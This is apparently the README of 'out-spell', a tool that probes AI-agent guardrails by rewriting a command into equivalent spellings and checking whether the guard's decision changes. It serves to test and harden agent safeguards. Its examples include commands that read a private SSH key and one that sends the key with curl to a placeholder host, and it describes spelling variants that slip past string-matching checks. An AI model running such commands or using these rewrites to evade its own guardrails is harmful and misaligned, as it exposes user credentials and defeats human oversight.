# out-spell

**Try to defeat your agent's guardrail with synonyms.**

A lot of AI-agent safety checks decide from the *surface text* — the command string, a path as written, a secret as spelled — instead of the *ground truth* they care about: the file that is actually read, the real action, whether a human can actually approve. I call that a **[stringly-typed guardrail](https://dev.to/cleiton_augusto_/stringly-typed-guardrails-how-agent-safety-checks-fail-by-matching-the-wrong-thing-2kef)**, and it almost always fails open: change the spelling, keep the meaning, and the dangerous action walks right past.

`out-spell` generates equivalent spellings of an input and asks your guard about each one. If a synonym of the same action gets a **different decision**, that's a gap — your guard is reading the label, not the box.

```
$ out-spell demo

base:    cat ~/.ssh/id_rsa
decision: BLOCK

FAMILY   DECISION  GAP   INPUT
------------------------------------------------------------------------
PATH     ALLOW     <==   cat $HOME/.ssh/id_rsa
PATH     ALLOW     <==   cat ${HOME}/.ssh/id_rsa
PATH     ALLOW     <==   cat "$HOME"/.ssh/id_rsa
PATH     ALLOW     <==   cat ~/".ssh/id_rsa"
PATH     ALLOW     <==   cat /home/you/.ssh/id_rsa

FOUND 5 gap(s): a synonym of the same action escaped the guard.
Your guard is reading the label, not the box.
```

The built-in `demo` guard blocks the literal `~/.ssh/id_rsa` but misses every other spelling of the same file — the exact shape of the bug class.

## Install

```sh
cargo install --git https://github.com/cleitonaugusto/out-spell
# or from a clone:
cargo build --release   # ./target/release/out-spell
```

No dependencies, single binary.

## Use it on your own guard

Point `out-spell` at a command that scores one input. Put `{}` where the input goes; with no `{}`, the input is sent on **stdin** (recommended — it sidesteps shell quoting). Your command prints a decision (`allow` / `block` / `ask` / `redact`) or uses its exit code (`0` = allow, non-zero = block).

```sh
# guard invoked with the candidate substituted for {}
out-spell check --guard './my-guard --check {}' 'cat ~/.ssh/id_rsa'

# guard that reads the candidate on stdin
out-spell check --guard './my-guard' 'curl -d @~/.ssh/id_rsa http://x/'

# just see the synonyms, no guard
out-spell transforms 'stripe --api-key sk_live_51...'

# machine-readable, and CI-friendly (non-zero exit when a gap is found)
out-spell check --json 'cat ~/.ssh/id_rsa'
```

`--home <path>` sets the home dir used for the absolute-path spelling (default `$HOME`).

## What it rewrites

- **PATH** — the same file spelled `~/x`, `$HOME/x`, `${HOME}/x`, `"$HOME"/x`, `~/"x"`, and the plain absolute `/home/you/x`. A guard that regex-matches `~/` or a fixed set of roots misses the rest.
- **SECRET** — a credential moved between `--flag value`, `--flag=value` and `-f value` (space vs `=`). A redactor keyed on `flag=value` misses the space-separated form. Fires only on secret-looking flags/values (password, token, api-key, `sk-`, `ghp_`, `AKIA`, …), not on ordinary args.

Roadmap: **MODE** (re-test the same action under every unattended run mode — cron, oneshot, webhook, subagent — where "ask the human" quietly becomes "approve"), symlink resolution, and URL-userinfo credentials.

## Why

This tool is the practical side of a bug class I keep finding while auditing open-source agent guardrails (reported privately, then written up): an [approval bypass in airlock](https://github.com/otsoa-dubief/airlock/security/advisories/GHSA-mgf8-gh7g-q4rg) and a [leaky redactor in needs-you](https://github.com/aydnOktay/hermes-needs-you/issues/2). The lesson for defenders: **decide on ground truth, detect by structure, and make the unknown case *stop*.**

If you want a control that can't be out-spelled at all, that's the project I build: **[CleiMesh](https://github.com/cleitonaugusto/cleimesh)** — signed, delegable permissions that a WebAssembly sandbox actually enforces, so the decision isn't made by looking at text.

Found a guard you can't fix, or want yours audited? Open an issue, or reach me at augusto.cleiton@gmail.com.

## License

MIT © Cleiton Augusto.
